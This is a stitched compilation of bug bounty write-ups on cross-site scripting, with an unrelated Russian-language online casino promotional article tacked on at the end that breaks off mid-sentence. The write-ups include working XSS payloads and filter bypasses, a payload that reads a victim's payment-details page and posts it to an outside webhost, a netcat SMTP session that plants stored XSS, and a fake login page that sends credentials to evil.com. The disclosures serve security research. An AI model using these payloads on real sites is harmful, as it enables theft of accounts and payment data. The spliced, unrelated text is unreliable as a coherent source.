could not be caught. The above-mentioned bug is quite interesting and dangerous, a whole subdomain was taken offline immediately after the report, perhaps in the future, I will reveal the report on the page hackerone.com/w2w if the program becomes public. A week later, I went through the results of the script for content discovery, where endpoint /verification was found, to which I did not attach much importance to at first, but I still set a script on it — the /verification/login subdirectory was found. After I went through the URL, the /verification/login/?redirect_uri=https://vulnerabledomain.com page was shown, which redirected to the redirect_uri value after logging in or immediately redirected if there was a session. After the flight to the intruder, open redirect protection bypass was discovered — vulnerabledomain.com@anotherdomain.com. I tried to escalate the bug to XSS — payload javascript:alert(1) failed, javascript:alert(1)// too. But payload javascript://https://vulnerabledomain.com/%250A1alert(1):0 shot, because due to the presence of https://vulnerabledomain, the parameter passed the white-list validation. Press enter or click to view image in full size *never gonna give you up song starts playing* After driving madly the mouse around the alert window (I always do this lol), I immediately switched to my cookie-based XSS. With the help of javascript:https://vulnerabledomain.com/%0A1?document%2ecookie%20%3d%20%27SID%3d137gf6g67f76fg6766123%5c%27-alert%28document%2edomain%29-%5c%27%3b%20expires%3dFri%2c%203%20Aug%202019%2020%3a47%3a11%20UTC%3b%20path%3d%2f%3b%20domain%3d%2evulnerabledomain%2ecom%3b%27%3a0, a cookie successfully set on *.vulnerabledomain.com. After visiting the page with the cookie, the coveted alert window has appeared! Double XSS, hooray! :) I updated a report and was waiting for an answer. Press enter or click to view image in full size On the same day, a nice catch arrived from the triager (if we can call it like this), and the bounty was paid. God bless the companies that pay on the triage! For the DOM-based XSS, with which I installed the cookie, the bounty also came to my account. Press enter or click to view image in full size Testing results: $1000 + $1000 + $200 (OR)+ $100(OR) = $2300 This program has been operating for more than a year, but in less than a month I was able to take first place in it and get away with testing quite far, I tried to fuzzing most endpoints, evaluate their reaction, understand how the site works and even tested the desktop application. This bug bounty has become one of my favorite programs on HackerOne. I hope you will find the same one too! :) Also, precisely this program gave me a new boost (mail.ru is the first) and with the help of it, I got to 2500 reputation (hello hoodie) and got 36th place in the leaderboard for reputation in 90 days, which should give me fresh private invites. Though it seems that private invites come regardless of my presence in the leaderboard, I often cancel old ones and wait for new ones in the queue. Short brief: Cookie-based XSS is quite exploitable. If you try and dig a little deeper, you can get a bounty instead of n/a, signal destruction and -5 reputation. If the program is old, it doesn’t mean that it doesn’t have vulnerabilities. If the fruitages hang on a tree for a long time, low-hanging fruits will be picked and immediately taken home (subdomain takeovers, etc.). Other fruits continue to hang, but higher. In order to get them, you need to make some effort. Sometimes it‘s better to focus on one program for a long time, find as many vulnerabilities as possible and constantly monitoring it. It is better to find the program that you prefer and break it. Perseverance and the desire to understand how a web application works, as well as certain functionalities and their interaction with each other, is the key to successful finding vulnerabilities in a bug bounty.

It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nReflected XSS in Tokopedia Train Ticket - Visat.me Visat .me Security Blog Poetry Security Blog Poetry 15 June 2019 #security Reflected XSS in Tokopedia Train Ticket Bypassing XSS filter via two reflected parameters. TL;DR There was an XSS filter that would encode GET parameter if it contains < character followed by > character. The filter could be bypassed by splitting </script/> closing tag into </script/ and > in two reflected parameters. Old Bug? Back in May 2018, I found a reflected XSS in Tokopedia train ticket. It was a simple reflected XSS in JavaScript context. I reported to Tokopedia security team and they told me my report was duplicate. I didn't bother to check if it was already fixed or not. In March this year, I was scrolling through my old emails and found the report. I re-tested, fuzzed here and there. Eventually, I found the vulnerability on the same page. Tag Filtering If you search a train ticket in Tokopedia , you will be redirected to a URL something like this https://tiket.tokopedia.com/kereta-api/search/Jakarta-Gambir-GMR/Bandung-Bandung-BD?adult=1&infant=0&trip=departure&dep_date=16-09-2019&ori=GMR&dest=BD . It stores all GET parameters to a JavaScript variable, dataJs.query . All GET parameters are stored in dataJs.query . It lives in the JavaScript context. So if you want to trigger an XSS you have to either: Break out of JavaScript context. Insert </script><script>alert(1)</script> in one of the parameters. This will malform the HTML parser to close the context, causing previous JavaScript execution to error (we don't care!) and start a new attacker-controlled script context. Break out of JavaScript variable, dataJs.query . Insert \"}; alert(1); // in one of the parameters. This will cause JavaScript parser to close the variable, execute our controlled script directly, and ignore the rest. My previous report was using the first method. The server didn't encode dangerous characters, such as < into &lt; . However, it encoded \" into \\\" , and \\ into \\\\ , so the second method couldn't be used. Then I noticed a strange behavior. The encoding used in ori and dest parameters was different than the rest. Notice how in other parameters, \" character got encoded into %22 . Different encoding was used. I tried with another dangerous character, > . > was not encoded in both parameters. Interesting, it was not encoded in ori and dest parameters. What if I insert both < and > characters? >< was not encoded. <> was encoded. Apparently the server did sanitize the parameters, but only if <.*> appears in the parameter! Bypassing the Filter First I thought yeah that's it, it can't be exploited. But then I was googling some XSS payload and found this awesome repository . It says: You can use // to close a tag instead of > . Let's try it. An error occurred. Chrome threw an error: Uncaught SyntaxError: Invalid or unexpected token . Okay I knew I was making a progress. Then I tried to insert XSS payload. XSS payload inserted. It didn't work, JavaScript parser doesn't consider it as a closing tag. I re-read the XSS payload repository again and found this on \"Bypass tag blacklisting\" section, </script/> . We knew the fact that we couldn't insert < and > characters on a same parameter because it would be encoded. But what if we separate </script/ and > on different parameters (i.e. ori and dest )? There would be other characters between them, in this case </script/\",\"dest\":\"> . Is that still a valid closing tag? XSS auditor highlighting the XSS payload. Turned out it was a valid closing tag! Chrome XSS auditor blocked the page, indicating there was a reflected XSS. Then I tried it on Firefox, and it worked! Here is the full payload I used: https://tiket.tokopedia.com/kereta-api/search/Jakarta-Gambir-GMR/Bandung-Bandung-BD?dep_date=26-06-2019&adult=1&infant=0&trip=departure&ori=</script//&dest=><svg/onload=alert(document.location.href))// . Proof of concept. Going Deeper Session cookie in Tokopedia (named _SID_Tokopedia ) is HTTP-only so we can't steal the session via XSS. But it turned out that the session cookie was accidentally stored in a JavaScript variable named dataSession.session.cookies . This defeats the purpose of HTTP-only attribute on the cookie. By exploiting the XSS, an attacker can steal victim's session as demonstrated on proof of concept video below. Timeline 28/03/2019 - Reported the vulnerability to Tokopedia security team. 08/04/2019 - Sent a follow-up email. The vulnerability was fixed and the report was valid with high severity. 11/06/2019 - Tokopedia rewarded IDR 3.000.000 and a certificate.

Here’s the full content:\n\nXSSing Google Employees — Blind XSS on googleplex.com - Web Security Blog Skip to content (Press Enter) Web Security Blog Thomas Orlita’s blog About Me About Me XSSing Google Employees — Blind XSS on googleplex.com by Thomas Orlita Vulnerabilities June 12, 2019 January 2, 2023 Google is an enormous company and it’s dependent on thousands of suppliers to keep it running. And since it needs some way to keep track and pay their suppliers, it offers a public online tool where suppliers upload their invoices to Google. It is called Google Invoice Submission Portal and can be found on gist-uploadmyinvoice.appspot.com . Google Invoice Submission Portal The first thing you’ve probably noticed is that the website is hosted on the appspot.com domain, which is publicly available for hosting Google App Engine projects. Google often uses it for building some of their websites, where in the end the production version is transferred over to google.com or some other domain. In this case, they likely forgot to publish the Invoice Upload site hosted on appspot.com to google.com . Uploading invoices The first thing it asks us to enter is a Purchase Order Number . It doesn’t really matter what we enter, just type a random number and click on the Search button. Then it wants to select an organization related to the invoice. This determines what country will the invoice be processed in. Again, just select some option and click on Submit . Now we can see a form with multiple inputs, namely for email , invoice number , invoice date, and a file select button for uploading the actual invoice in a PDF format. Finding the vulnerabilities I tried filling these text fields with various XSS payloads hoping that somewhere in their invoices dashboard they haven’t correctly escaped the inputs which would trigger a blind XSS that would send me a notification. But this wasn’t the case. I haven’t received anything so the text fields were most likely handled correctly. Apart from text input, there’s also the input for selecting a PDF file. But it’s configured so that only PDF files can be selected to upload. Since this is just a front-end validation, it doesn’t stop us from changing the file type when sending the upload POST request. Once we select any PDF file, an upload request is fired. We can intercept the request using a web proxy debugger and change the filename and the contents from .pdf to .html . POST request for uploading the PDF file First, we change the filename property to test.html , the Content-Type to text/html and the body to an XSS payload. In the payload, I’ll use a <script> tag with src pointing to an endpoint on my domain that sends me an email every time it’s loaded. I’m using ezXSS for logging these blind XSS requests. Now the HTML file has been attached to the form and we can click on the Submit Invoices button to send the form. Executing the blind XSS Some days later I’ve received a notification that a blind XSS has been executed on the googleplex.com domain. Google uses googleplex.com for hosting internal websites and apps. If you try to go to the domain, you’ll be redirected to a Google Corp login page (also know as MOMA login page) – which requires a valid google.com account. That means it’s accessible only by Google employees. googleplex.com blind XSS details The DOM of the page matches the XSS payload that was put in place of the PDF file. We can see that this URL is used for displaying a PDF file. But since the Content-Type of the uploaded file was changed from application/pdf to text/html , it displayed and rendered the XSS payload instead of the PDF. Impact Executing a custom JavaScript code on this googleplex.com subdomain allows the attacker to gain access to Google’s invoices and other sensitive information. Since the Google Employee is logged in using their company account, it should be possible to access other internal sites on their behalf as well. Update : The previous paragraph is incorrect. I’ve received more information from Google’s Security Team: Access to a single googleplex.com app does not give you access to any other googleplex.com apps, they are all independent from each other and isolated and the credentials and cookies can’t be stolen or used against other sites. This means the attacker could still access the subdomain where invoices are handled, but access to other apps on googleplex.com wasn’t possible due to CORS. Fixing the vulnerability I’ve sent details about this vulnerability to Google as soon as possible. After adding some additional information, four days later I’ve received an update that the report has been accepted. After about a month later I’ve been able to confirm that it has been fixed. Although after it’s been fixed an XSS was still fired, it wasn’t on googleplex.com , but on storage.googleapis.com — which acts as a sandbox domain and is as well used (also like g oogleusercontent.com ) for storing uploaded user content. The XSS is now on a sandboxed domain where the XSS poses no risk for the user/employee.

It was a private program on bugcrowd, let’s just say it was named Redact. Here is the URL https://www.redact.com/us/en/my-account/quotes?searchCriteria=QuoteID&amountOperator=equal&searchValue= XSS The parameter searchValue was reflected inside an input feild. So by putting an “ I was able to break out of the input field, after that, I tried the most basic payload “><script>alert(1)</script>, but unfortunately my request was blocked by WAF. so I tried another payload “onmouseover=alert(1) and again my request was blocked by WAF. After some playing around, I found out that anything between <> was being removed, so if type something like this “o<x>nmouseover=alert<x> 1 // <x> will be removed leaving it only with “onmouseover=alert(1)// and finally i was able to pop up a XSS. Now there was a page which allows the user to view their payment Data https://www.redact.com/us/en/smbpro/my-account/payment-details , so I thought it would be a good idea to include this in my report that how I can get users credit card data with this XSS. So the Payload for stealing user credit card data was this “o<x>nmouseover=$.get<x>(‘https://www.redact.com/us/en/my-account/payment-details',function<x>(res){$.post<x>('https://osamaavvan.000webhostapp.com/r.php',{res})})// As the page was using jQuery, I requested the whole payment data page with $.get() and posted the page content to my server with $.post(), so now with this payload, I was able to get users payment data: https://www.redact.com/us/en/my-account/quotes?searchCriteria=QuoteID&amountOperator=equal&searchValue=“o<x>nmouseover=$.get<x>(‘https://www.redact.com/us/en/my-account/payment-details',function<x>(res){$.post<x>('https://osamaavvan.000webhostapp.com/r.php',{res})})// Press enter or click to view image in full size But unfortunately, my report got duplicate.

Stored XSS Plenum 2 min read · Jul 16, 2019 -- 1 Listen Share If you are reading this you are probably wondering what is this? is this some kind of a joke? The answer is No, and it is not a clickbait, this is the story of chaining small issues and pivoting from a self XSS to a fully blown Stored XSS. Press enter or click to view image in full size JUST A RANDOM PHOTO T he journey began when i started hacking on a private program, and while doing my research i came across a self XSS issue which hey were aware of and it was explicitly out of scope. So i kept digging and started to learn how the app worked, it had CRM and other related stuff which is not really important for now. The app had multiple parts and one of them was client management with regular functionalities like create/delete/modify clients, create/attach invoices… the self xss existed in the information fields of the client’s view. <a tlclick=”sendEmail(&quot;email_here&quot;)”>email_here</a> By adding a simple ‘ to the email i was able to break the html and then add my own attributes. After some more digging i found out that if you send an email to the invoice email address the app would check if the email address of the sender existed in the client’s database and if found it would create a new ticket for that client but what if we send an email from a non client address? A new client is created along side with the new ticket. Now since i can control parts of client information (email address), i need to be able to send really miss formed emails and the easiest way to do that is to use NETCAT. So i just opened a new terminal queried for their email server and started building the exploit. First i had to build a working XSS then i had to figure out which characters break the SMTP syntax and encode them, ended up with a an email like this ‘onmouseover=’alert&#40localStorage.oauth&#41'@plenumsec.com The final attack looked something like this nc -C mxa.mailgun.org 25 >HELO plenumsec.com >MAIL FROM: <'onmouseover='alert&#40localStorage.oauth&#41'@plenumsec.com> >RCPT TO: <random@target.com> >DATA From: Attacker <'onmouseover='alert&#40localStorage.oauth&#41'@plenumsec.com> To: Victim <random@target.com> Subject: Urgent Date: Wed, 26 Sep 2018 14:21:26 -0400 Hello, This is a stored xss poc. Goodbye. Now an attacker would just wait for the employee to visit the client management page or perform any action that includes the attacker’s email. The company email was completely guessable and thus could be targeted by just bruteforcing and automating the process. One would argue that this attack could have been avoided by implementing SPF but sometimes security is not convenient for businesses so they have to make compromises.

So simple created the html + js code to steal email & pass of victim. <!DOCTYPE html> <html> <head> <title>XSS</title> </head> <body> <center><div class=\"panel-body\"> <h3>Something Went Wrong Please Login Again</h3> <div class=\"login-group\"> <label for=\"email\" class=\"control-label\">Email</label> <input id=\"Vemail\" class=\"input span12\" name=\"email\" required=\"\" type=\"email\" value=\"\" autofocus=\"\"> </div> <div class=\"login-group\"> <label for=\"password\" class=\"control-label\">Password</label> <input id=\"Vpass\" class=\"input span12\" name=\"password\" required=\"\" type=\"password\" value=\"\"> <div class=\"alert alert-error error hide\" id=\"error_missingPassword\">Please enter your password</div> </div> <button class=\"action-button btn btn-primary login-button\" buttontype=\"login\" type=\"submit\" onclick=\"myFunction()\">Login</button> </div> <script> function myFunction() { var x = document.getElementById(\"Vemail\").value; var y = document.getElementById(\"Vpass\").value; var pwd = x + \":\" + y; alert(pwd); window.location = \"https://evil.com/\" + pwd; } </script> </body> </html> This is a simple html code with 2 input fields with 1 button asking for Email and Password & the JS code simply get the input field value & send it to attacker server and upload the code the web host. Press enter or click to view image in full size Simply use I frame to load the code from web host. Press enter or click to view image in full size This is how i look like. Press enter or click to view image in full size Everything is good now all I need is to send the user this form. <html> <body> <form action=\"https://attacker.com/login/submit\" method=\"POST\"> <input type=\"hidden\" name=\"email\" value=\"email@gmail.com\" /> <input type=\"hidden\" name=\"password\" value=\"password\" /> <input type=\"submit\" value=\"Submit request\" /> </form> </body> </html> This is simply make victim to login in my account without knowing him & when he login in my account he see the msg Something Went Wrong with input fields & try to login when he try the JS code simply get the email & pass victim enter and send it to attacker server Press enter or click to view image in full size I hope you like it :) ./Logout JavaScript -- -- 5 Written by Saad Ahmed 636 followers · 1 following Responses ( 5 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}

Because it was a private program I will the name the site as www.example.com everywhere. So lets start, The program seemed to be quite old but its scope was wide with a bunch of domains.I thought that many people might have already tested the main domain. So I thought of exploring other domains in the list first. During the initial testing I did’nt find anything useful.Then I thought of doing some google dorking using Site:*.example.com inurl:redirect and appending various things like intext: ../index, admin , sql , url , redirect etc. After using redirect in inurl parameter I got an interesting endpoint like this example.com/social?redirect=/somewhere It suddenly took my interest and I started looking for bugs in it. First I tried redirecting it to google.com and it worked. Then I thought of javascript uri parsers which can lead to xss. And added this simple javascript uri in redirect parameter example.com/social?redirect=javascript://alert(1) And now the site took me to the login page as I was not logged in to the site. I logged in and alert popped up. There was also no protection on logout so user can be logged out of his account and then again be sent to this malicious url and when he enters the creds xss executes and the attacker can do whatever he want like phishing, cookie stealing, keylogging, etc. Unfortunately the same endpoint was also on some other domains of that program so they were also vulnerable. The program responded very fastly and gave a good reward. THINGS TO CONSIDER FROM THIS BUG: If you are lost in a program and dont find anything, always look for other things like google dorking, reading source code for some other endpoints which are not seen in main app and might be many hunters have missed them. QUICK TIP I will add a small list of dorks you can use to find these kind of bugs. inurl: redirect,url,next,redirect_to,page,site These can even lead to ssrf if there is not proper sanitization in code.So keep digging on these. You can also try other dorks for finding hidden gems. You can find the latest updated dorks here https://www.exploit-db.com/google-hacking-database . Google dorking is great to find some sensitive endpoints,parameters, always give it a try during your testing :) I will post some of my more findings here in the upcoming weeks. Till then keep hacking and sharing. This community is great and we should learn from each other and share. #TogetherWeHitHarder Thanks, Jatin Twitter : https://twitter.com/techyfreakk Security Infosec Bug Bounty Pentesting Hackerone -- -- 1 Written by Jatin Nandwana 131 followers · 1 following Web application pentester Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}

So here is the write-up of my recent finding. The web application allows you to create a virtual library. In the library, you can add files, folder , links, quiz. And when a user adds the name to the folder with evil chars, it was sanitized correctly. After hours of enumeration, I found another endpoint where only the folder name was getting reflected, and it was not correctly being sanitized. Below are the steps to reproduce the stored XSS vulnerability: 1: Open Https://edmodo.com/library 2: Make a new folder 3: Input this payload “ </title></head><body onload=alert(1)></body><! — “ in the name field. 4: Intercept the request and note down the [folder-id] 5: Open https://www.edmodo.com/folder/[folder-id ] , a pop-up will come.

Here’s the full content:\n\nXSS attacks on Googlebot allow search index manipulation - Tom Anthony Tom Anthony About Tom Iâ€™m an SEO Analyst at Distilled, which keeps me very busy so Iâ€™m no longer available for freelance Web Development or SEO work. Sorry! Over the last few years, when not working on cool web projects, Iâ€™ve been kept mostly busy studying for my PhD in Artificial Intelligence. Iâ€™m currently writing up my thesis, and am looking forward to having achieved that goal. If youâ€™d like to read my publications, you can visit my University of Hertfordshire web page about my research which is concerned with Information Theoretic Methods for Generating Intelligent Behaviours. My areas of interest include search engine optimisation, web development, mobile devices and all the cool things they can do, artificial intelligence and artificial life, martial arts and puzzles. Blog Posts Contact If you have a question about one of my blog posts, please do post in the comments section so that others can also help to answer and benefit from the discussion. If you are interested in hiring me for a freelance SEO or Web Development project, then unfortunately Iâ€™m probably going to be unable to take it on because Iâ€™m very busy and my priority is with my day job and my most important project of all â€“ my soon to be born daughter! However, if you think you have a compelling project and want to try to persuade me, or just get my feedback, then please fill in the form below. XSS attacks on Googlebot allow search index manipulation May 1, 2019 All Posts | Security | SEO Short version: Googlebot is based on Google Chrome version 41 (2015), and therefore it has no XSS Auditor, which later versions of Chrome use to protect the user from XSS attacks. Many sites are susceptible to XSS Attacks, where the URL can be manipulated to inject unsanitized Javascript code into the site. Since Googlebot executes Javascript, this allows an attacker to craft XSS URLs that can manipulate the content of victim sites. This manipulation can include injecting links, which Googlebot will follow to crawl the destination site. This presumably manipulates PageRank, but I’ve not tested that for fear of impacting real sites rankings. I reported this to Google in November 2018, but after 5 months they had made no headway on the issue (citing internal communication difficulties), and therefore I’m publishing details such that site owners and companies can defend their own sites from this sort of attack. Google have now told me they do not have immediate plans to remedy this. Last year I published details of an attack against Google’s handling of XML Sitemaps , which allowed an attacker to ‘borrow’ PageRank from other sites and rank illegitimate sites for competitive terms in Google’s search results. Following that, I had been investigating other potential attack when my colleague at Distilled, Robin Lord , mentioned the concept of Javascript injection attacks which got me thinking. XSS Attacks There are various types of cross-site scripting (XSS) attack; we are interested in the situation where Javascript code inside the URL is included inside the content of the page without being sanitized. This can result in the Javascript code being executed in the user’s browser (even though the code isn’t intended to be part of the site). For example, imagine this snippet of PHP code which is designed to show the value of the page URL parameter: If someone was to craft a malicious URL where instead of a number in the page parameter they instead put a snippet of Javascript: https://foo.com/stores/?page=<script>alert('hello')</script> Then it may produce some HTML with inline Javascript, which the page authors had never intended to be there: That malicious Javascript could do all sorts of evil things, such as steal data from the victim page, or trick the user into thinking the content they are looking at is authentic. The user may be visiting a trusted domain, and therefore trust the contents of the page, which are being manipulated by a hacker. Chrome to the rescue It is for that reason that Google Chrome has an XSS Auditor, which attempts to identify this type of attack and protect the user (by refusing to load the page): So far, so good. Googlebot = Chrome 41 Googlebot is currently based on Chrome version 41, which we know from Google’s own documentation. We also know that for the last couple of years Google have been promoting the fact that Googlebot executes and indexes Javascript on the sites it crawls. Chrome 41 had no XSS Auditor (that I’m aware of, it certainly doesn’t block any XSS that I’ve tried), and therefore my theory was that Googlebot likely has no XSS Auditor. So the first step was to check, whether Googlebot (or Google’s Website Rendering Service [WRS], to be more precise) would actually render a URL with an XSS attack. One of my early tests was on the startup bank, Revolut — a 3 year old fintech startup with $330M in funding having XSS vulnerabilities demonstrates the breadth of the XSS issue (they’ve now fixed this example). I used Google’s Mobile Friendly Tool to render the page, which quickly confirms Google’s WRS executes the XSS Javascript, in this case I’m crudely injecting a link at the top of the page: It is often (as in the case with Revolut) possible to entirely replace the content of the page to create your own page and content, hosted on the victim domain. Content + links are cached I submitted a test page to the Google index, and then examining the cache of these pages shows that the link being added to the page does appear in the Google index: Canonicals A second set of experiments demonstrated (again via the mobile friendly tool) that you can change the canonicals on pages: Which I also confirmed via Google’s URL Inspector Tool, which reports the injected canonical as the true canonical (h/t to Sam Nemzer for the suggestion): Links are crawled and considered At this point, I had confirmed that Google’s WRS is susceptible to XSS attacks, and that Google were crawling the pages, executing the Javascript, indexing the content and considering the search directives within (i.e. the canonicals). The next important stage, is does Google find links on these pages and crawl them. Placing links on other sites is the backbone of the PageRank algorithm and a key factor for how sites rank in Google’s algorithm. To test this, I crafted a page on Revolut which contained a link to a page on one of my test domains which I had just created moments before, and had previously not existed. I submitted the Revolut page to Google and later on Googlebot crawled the target page on my test domain. The page later appeared in the Google search results: This demonstrated that Google was identifying and crawling injected links. Furthermore, Google confirms that Javascript links are treated identically to HTML links (thanks Joel Mesherghi ): All of this demonstrates that there is potential to manipulate the Google search results. However, I was unsure how to test this without actually impacting legitimate search results, so I stopped where I was (I asked Google for permission to do this in a controlled fashion a few days back, but not had an answer just yet). How could this be abused? The obvious attack vector here is to inject links into other websites to manipulate the search results – a few links from prominent sites can make a very dramatic difference to search performance. The https://www.openbugbounty.org/ lists more than 125,000 un-patched XSS vulnerabilities . This included 260 .gov domains, 971 .edu domains, and 195 of the top 500 domains (as ranked by the Majestic Million top million sites. A second attack vector is to create malicious pages (maybe redirecting people to a malicious checkout, or directing visitors to a competing product) which would be crawled and indexed by Google. This content could even drive featured snippets and appear directly in the search results. Firefox doesn’t yet have adequate XSS protection, so this pages would load for Google users searching with Firefox. Defence The most obvious way to defend against this is to take security seriously and try to ensure you don’t have XSS vulnerabilities on your site. However, given then numbers from OpenBugBounty above, it is clear that that is more difficult that it sounds – which is the exact reason that Google added the XSS Auditor to Chrome! One quick thing you can do is check your server logs and search for URLs that have terms such as ‘script’ in them, indicating a possible XSS attempt. Wrap up This exploit is a combination of existing issues, but combine to form an zero-day exploit that has potential to be very harmful for Google users. I reported the issue to Google back on November 2018, but they have not confirmed the issue from their side or made any headway addressing it. They cited “difficulties in communication with the team investigating”, which felt a lot like what happened during the report of XML Sitemaps exploit . My impression is that if a security issue affects a not commonly affected part of Google, then the internal lines of communication are not well oiled. It was March when I got the first details, when Google let me know “that our existing protection mechanisms should be able to prevent this type of abuse but the team is still running checks to validate this” – which didn’t agree with the evidence. I re-ran some of my tests and didn’t see a difference. The security team themselves were very responsive, as usual, but seemingly had no way to move things forward unfortunately. It was 140 days after the report when I let Google know I’d be publicly disclosing the vulnerability, given the lack of movement and the fact that this could already be impacting both Google search users, as well as website owners and advertisers. To their credit, Google didn’t attempt to dissuade me and asked me to simply to use my best judgement in what I publish. If you have any questions, comments or information you can find me on Twitter at @TomAnthonySEO , or if you are interested in consulting for technical/specialised SEO, you can contact me via Distilled . Disclosure Timeline 3rd November 2018 – I filed the initial bug report. Over the next few weeks/months we went back and forth a bit. 11th February 2019 – Google responded letting me know they were “surfacing some difficulties in communication with the team investigating” 17th April 2018 – Google confirmed they have no immediate plans to fix this. I believe this is probably because they are preparing to release a new build of Googlebot shortly (I wonder if this was why the back and forth was slow – they were hoping to release the update?) 7 responses to “XSS attacks on Googlebot allow search index manipulation” peter May 2, 2019 at 7:32 am can this trick works now?i want to check? what will be the code if i want to a specific page of mine to other domain, let me know zsh May 2, 2019 at 1:07 pm In the timeline is April 18 2018 supposed to be 2019? Thanks Doc Sheldon May 2, 2019 at 8:09 pm Thanks for this, Tom… VERY concerning, particularly with Google’s response being “… do not have immediate plans to remedy this.” You’ve just got a new follower! 😉 Kirill T. May 3, 2019 at 8:59 am Nice finding, Tom. By the way, some Russian guy has translated this article, but I rather prefer the original. Lukas May 6, 2019 at 8:12 am I have a feeling that last update in disclosure timeline has the wrong year in it. Yannick May 7, 2019 at 10:14 pm Google just announced at I/O that they would use the latest version of Chromium from now on to crawl. Interpromote May 8, 2019 at 4:28 am Looks like google pushed that Googlebot build update today for Chrome 74. Wonder if that means this is fixed? Learn more about me on my about page .

Казино проводит ежедневные промо, турниры и предоставляет интуитивно понятный интерфейс, особенно удобный для новичков. Мы видим, что у операторов увеличивается акцент на мобильные приложения. Это делает игры доступными в любое время. Среди популярных слотов пользователи чаще выбирают Book of Ra от Novomatic и Mega Moolah от Microgaming. Критерии выбора надежного казино Чтобы обеспечить безопасность и прозрачность игры, нужно учитывать несколько ключевых параметров: Лицензия. Надежные площадки, такие как упомянутые выше, обычно имеют лицензии КРАИЛ или международные, например, от Malta Gaming Authority. Методы оплаты. Важны варианты пополнения и вывода средств, включая банковские карты, электронные кошельки и криптовалюты. Бонусы и акции. Платформы предлагают приветственные бонусы, фриспины и программы лояльности, привлекая новых игроков. Отзывы и репутация. Реальные отзывы помогают оценить качество сервиса. Техподдержка. Круглосуточная поддержка делает игру комфортной и безопасной. При выборе платформы стоит проверить каждый критерий, чтобы получить максимально позитивный опыт. Особенности украинских казино онлайн Украинские казино онлайн привлекают игроков благодаря разнообразию игр, гибким бонусным предложениям и прозрачному регулированию. Рассмотрим ключевые аспекты работы этих платформ. Законодательство и регулирование Украинское правительство активно регулирует рынок онлайн-гемблинга. С 2020 года казино обязаны получать лицензию Комиссии по регулированию азартных игр и лотерей (КРАИЛ). Лицензия подтверждает, что платформа соблюдает закон, использует сертифицированные игры и обеспечивает защиту данных игроков. Например, такие известные казино как Cosmolot и Parimatch успешно прошли лицензирование, гарантируя честность и прозрачность. Разнообразие игр Украинские казино отличаются широким выбором развлечений. Игровые автоматы занимают лидирующую позицию, предлагая тысячи вариантов с разными тематиками. В дополнение к слотам популярны рулетка, блэкджек, баккара и покер. Live-игры с реальными дилерами, представленные на платформах вроде Parimatch, создают атмосферу настоящего казино. Также отмечаем наличие джекпотов и турниров, стимулирующих азарт. Бонусы и акции Большинство украинских казино предоставляют привлекательные бонусы. Новички получают приветственные пакеты, такие как депозитные бонусы до 150% и бесплатные вращения на слотах. Постоянные игроки участвуют в программах лояльности, еженедельных акциях и турнирах. Cosmolot, например, известен ежедневными бонусами, а Slotoking продвигает систему кэшбэка. Эти предложения увеличивают шансы на выигрыш и повышают интерес пользователей. Методы платежей в украинских казино онлайн Онлайн-казино в Украине предлагают широкий выбор методов оплаты, чтобы удовлетворить запросы пользователей. Рассмотрим самые популярные варианты и их особенности. Популярные способы депозитов и выводов Мы отмечаем, что самые востребованные методы оплаты включают банковские карты Visa и Mastercard, которые обеспечивают надежность и быстроту транзакций. Также популярны электронные кошельки, такие как Monobank, Приват24 и Qiwi, благодаря удобству и моментальному зачислению средств. Множество казино поддерживают криптовалютные платежи (Bitcoin, Ethereum), что обеспечивает анонимность и высокую безопасность операций. Некоторые платформы предлагают прямые переводы через мобильных операторов, таких как Киевстар и Vodafone, что делает процесс особенно доступным для пользователей без банковских карт. Комиссии и скорость транзакций Размер комиссии зависит от выбранного метода. Обычно операции через банковские карты или электронные кошельки проходят без лишних сборов, тогда как криптовалютные переводы нередко включают сетевые комиссии. Мобильные платежи иногда сопровождаются небольшими дополнительными затратами со стороны оператора. Скорость обработки транзакций особенно важна для игроков. Депозиты через карты и электронные кошельки зачисляются мгновенно, тогда как вывод средств обычно занимает от 1 до 3 рабочих дней. Криптовалютные операции проходят быстрее, среднее время обработки редко превышает несколько часов. Преимущества и недостатки игр в украинских казино онлайн Украинские онлайн-казино предлагают множество игровых возможностей, но важно понимать как их преимущества, так и возможные ограничения. Рассмотрим обе стороны. Основные преимущества Доступность и удобство. Играть можно в любое время и из любого места, будь то смартфон, планшет или компьютер. Многие казино имеют мобильные приложения с адаптивным интерфейсом. Широкий выбор игр. Украинские платформы предлагают сотни слотов, настольных игр, рулеток и live-дилеров. Примеры популярных игр включают «Книга Ра», европейскую рулетку и блэкджек. Бонусные программы. Новые игроки получают приветственные бонусы, а постоянные — кэшбек, фриспины и регулярные акции. Такие игры, как в Cosmolot и Parimatch, часто сопровождаются ежедневными или персонализированными наградами. Безопасность транзакций. Лицензионные казино применяют шифрование данных и предлагают защищённые методы платежей, включая Visa, Приват24 и криптовалюты, что гарантирует безопасность финансовых операций. Правовая защита. С лицензией от КРАИЛ игроки защищены юридически, их данные хранятся в соответствии с украинскими законами. Возможные риски и ограничения Игровая зависимость. Некоторые пользователи могут столкнуться с аддикцией. Надёжные казино предлагают функцию самоисключения или лимитов для контроля. Финансовые потери. Азартные игры не гарантируют доход; ставки связаны с риском потерь. Ограничения доступа. Платформы с лицензией КРАИЛ доступны только пользователям из Украины, а иностранные казино могут быть заблокированы. Скорость вывода средств. В зависимости от метода платежей, процесс может занимать до 3 рабочих дней, что требует планирования. Блокировки и технические проблемы. Иногда из-за сбоев или интернет-ограничений доступ к платформам может быть временно недоступен. Мы всегда рекомендуем взвешивать преимущества и риски, чтобы делать ставки осознанно и получать только позитивные эмоции. Советы для новичков Новые игроки часто сталкиваются с трудностями из-за отсутствия опыта. Давайте разберёмся, как сделать старт в украинских онлайн-казино комфортным и безопасным. Как начать игру без ошибок Выбор лицензированного казино. Играть стоит только на платформах с лицензией КРАИЛ. Это гарантирует защиту данных и честные выплаты. Регистрация с корректными данными. Указываем только реальные данные: имя, дату рождения и контактную информацию, чтобы избежать проблем с выводом средств. Изучение правил игры. Читаем правила каждого автомата или стола, особенно перед ставками на реальные деньги. Это помогает понимать механику и избегать неоправданных потерь. Определение бюджета. Устанавливаем дневной или недельный лимит на ставки. Это предотвратит финансовые риски и сохранит положительные эмоции. Проверка отзывов. Читаем мнения пользователей об условиях вывода средств, поддержке и игровых автоматах. Частые ошибки игроков Игнорирование лицензии. Некоторые новички выбирают незарегистрированные казино из-за бонусов, что может привести к потере средств. Пренебрежение акциями. Игроки не используют приветственные бонусы или программы лояльности, хотя они увеличивают шансы на выигрыш. Отсутствие стратегии. Делать ставки 